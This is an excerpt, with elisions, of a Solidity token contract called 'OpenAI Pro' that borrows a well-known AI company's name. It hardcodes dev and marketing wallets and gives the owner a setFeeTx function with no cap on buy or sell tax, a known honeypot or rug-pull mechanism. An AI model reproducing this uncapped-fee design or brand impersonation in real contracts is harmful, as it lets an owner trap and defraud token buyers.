...
contract AntiBotLiquidityGeneratorToken is Context, IERC20 { 
    ...
    address payable private Wallet_Marketing = payable(0x2e108cDA3731C9b3D7f8Be6872C38379109e6849); 
    address payable private Wallet_Dev = payable(0x463013255408bBA4c1C3a4f9652507A2a08e81E7);
    ...
    string private constant _name = "OpenAI Pro"; 
    string private constant _symbol = unicode"PRIMUS"; 
    ...
    constructor () {
        ...
        _owner = 0x463013255408bBA4c1C3a4f9652507A2a08e81E7;
    ...
    function setFeeTx (uint256 newbuyFeeTx, uint256 newsellFeeTx) external onlyOwner{
                _Tax_On_Buy = newbuyFeeTx;
                _Tax_On_Sell = newsellFeeTx;
    }
